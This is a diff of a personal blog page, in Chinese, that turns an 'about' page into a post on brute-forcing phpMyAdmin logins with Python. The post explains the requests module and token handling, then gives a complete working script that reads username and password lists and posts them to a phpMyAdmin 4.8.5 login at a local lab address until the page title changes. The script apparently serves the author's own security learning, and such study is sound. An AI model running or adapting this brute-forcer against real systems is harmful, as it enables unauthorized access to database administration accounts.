@@ -5,7 +5,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Hoylindo || about</title>
+    <title>Hoylindo || Python爆破phpmyadmin</title>
     <meta name="author" content="hoylindo">
     <meta name="description" content="嗨，这里是一个搭建的不太熟练的小破站 ">
     <meta name="keywords" content=" ">
@@ -153,30 +153,156 @@
 <link rel="stylesheet" href="/css/post-body.css">
 <div class="article">
     <div>
-        <h1>about </h1>
+        <h1>Python爆破phpmyadmin </h1>
     </div>
     <div class="info">
         <span class="date">
             <span class="icon">
                 <a-icon type="calendar" theme="filled" />
             </span>
-            2022/8/13
+            2022/8/30
         </span>
 
         
+        <span class="category">
+            <a href="/categories/关于web安全">
+                <span class="icon">
+                    <a-icon type="book" theme="filled" />
+                </span>
+                关于web安全
+            </a>
+        </span>
+        
 
+        
+
+        <span class="tags">
+            <span class="icon">
+                <a-icon type="tags" theme="filled" />
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/tags/Python" style=color:#00bcd4>
+                    Python
+                </a>
+            </span>
+            
+        </span>
         
     </div>
 
     <div class="content" v-pre>
-        <h2 id="看这里——"><a href="#看这里——" class="headerlink" title="看这里——"></a>看这里——</h2><ul>
-<li><p>第一次搭博客花了好久好久，不过它终于勉强有一个博客的形状啦</p>
-</li>
-<li><p>是一个很想卷起来但是一点也不自律的摆烂小白——</p>
-</li>
-<li><p>具体表现为：安全也菜算法也菜连打游戏都菜的要命</p>
-<img src="1.jpg" align="left" style="zoom: 50%;" /></li>
+        <p>第一次写脚本，花了好久好久好久</p>
+<span id="more"></span>
+
+<h3 id="关于python的requests模块"><a href="#关于python的requests模块" class="headerlink" title="关于python的requests模块"></a>关于python的requests模块</h3><ul>
+<li>主要用来发 送 HTTP 请求</li>
+<li>每次调用 requests 请求之后，会返回一个 response 对象，该对象包含了具体的响应信息</li>
+<li><code>text</code>——返回响应的内容，unicode 类型数据</li>
+<li><code>status_code</code>——返回 http 的状态码</li>
+<li>关于requests的一些方法：<ul>
+<li><code>get(url, params, args)</code>——发送 GET 请求到指定 url</li>
+<li><code>post(url, data, json, args)</code>——发送 POST 请求到指定 url</li>
+<li><code>request(method, url, args)</code>——向指定的 url 发送指定的请求方法</li>
 </ul>
+</li>
+<li>ss = requests.session()  会实例化一个会话对象<ul>
+<li>会话对象能够跨请求保持某些参数，它也会在同一个 Session 实例发出的所有请求之间保持 cookie</li>
+<li>会话对象具有主要的 Requests API 的所有方法，可以当成 Request去使用</li>
+</ul>
+</li>
+</ul>
+<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><ul>
+<li>呜呜呜其实也没啥思路，这标题还挺不好意思的</li>
+<li>先是抓个包看看参数，然后还试了一下bp爆破但是那个返回长度看不出啥</li>
+<li>然后就一顿搜，发现bp确实是不行的，因为它这里那个参数 token 和 set_session 是一直在变的</li>
+<li>然后判断有没有成功登录是通过标题</li>
+<li>这里获取标题以及从源码里获取token用的是同一个方法：<ul>
+<li><code>findall(pattern, string, flags=0)</code>——返回string中所有与pattern匹配的全部字符串,返回形式为数组</li>
+<li>因此获取token就可以用这段代码：<code>findall(&quot;name=\&quot;token\&quot; value=\&quot;(.*?)\&quot; /&gt;&quot;, text)</code></li>
+</ul>
+</li>
+<li>然后（<a target="_blank" rel="noopener" href="https://blog.csdn.net/u014794539/article/details/119410982">一哥的</a>）流程大概就是：<ul>
+<li>先发了个post请求给这个页面，然后获取它返回的标题和token</li>
+<li>然后循环把存着用户名和密码的文件读入然后进行了utf-8编码，分别赋给<code>pma_username</code>和<code>pma_password</code></li>
+<li>然后再带着data发一个post请求，获取标题和token</li>
+<li>然后把传入data后获得的标题和传入之前的做比较，如果不相等，就说明登陆成功了</li>
+<li>成功了就把请求的url和对应的用户名密码写到文件里，失败了就继续循环</li>
+<li>然后就是token这里他还有个编码处理：<ul>
+<li>使用<code>html.unescape()</code>方法，可以将ascii字符串转换为html脚本</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="接下来就是我查重率估计有99-的代码了"><a href="#接下来就是我查重率估计有99-的代码了" class="headerlink" title="接下来就是我查重率估计有99%的代码了"></a>接下来就是我查重率估计有99%的代码了</h3><pre><code class="python">import requests
+import re
+import html
+
+# url
+url = &#39;http://192.168.0.111/phpMyAdmin4.8.5/index.php&#39;
+s = requests.session()
+s.headers = &#123;
+    &#39;User-Agent&#39;: &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0&#39;,
+    &#39;Accept&#39;: &#39;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8&#39;,
+    &#39;Accept-Encoding&#39;: &#39;gzip, deflate&#39;
+&#125;
+
+
+def get_token(rp):
+    token = re.findall(&#39;name=\&quot;token\&quot; value=\&quot;(.*?)\&quot; /&gt;&#39;, rp)
+    return html.unescape(token[0]) if token else &#39;No token found&#39;
+
+
+def get_title(rp):
+    title = re.findall(&#39;&lt;title&gt;(.*?)&lt;/title&gt;&#39;, rp)
+    return title[0] if title else &#39;No title found&#39;
+
+
+def set_data(user, password, token):
+    data = &#123;
+        &#39;pma_username&#39;: user,
+        &#39;pma_password&#39;: password,
+        &#39;server&#39;: 1,
+        &#39;target&#39;: &#39;index.php&#39;,
+        &#39;token&#39;: token
+    &#125;
+    return data
+
+
+def start_attacking():
+    try:
+        rp = s.post(url=url)
+        token = get_token(rp.text)
+        ta = get_title(rp.text)
+        with open(&#39;user.txt&#39;, &#39;r+&#39;) as u:
+            for i in u:
+                with open(&#39;password.txt&#39;, &#39;r+&#39;) as p:
+                    for j in p:
+                        user = i.strip()
+                        password = j.strip()
+                        rp = s.post(url=url, data=set_data(user, password, token))
+                        token = get_token(rp.text)
+                        tb = get_title(rp.text)
+                        if ta != tb:
+                            print(&#39;Success! user: &#39; + user + &#39; | password: &#39; + password)
+                            return 1
+                        else:
+                            pass
+    except Exception as e:
+        print(e.args)
+        return -1
+    return 0
+
+
+if __name__ == &quot;__main__&quot;:
+    rs = start_attacking()
+    if rs == 0:
+        print(&#39;Fail! No matching user and password were found in the files.&#39;)
+    else:
+        pass
+</code></pre>
 
     </div>
 
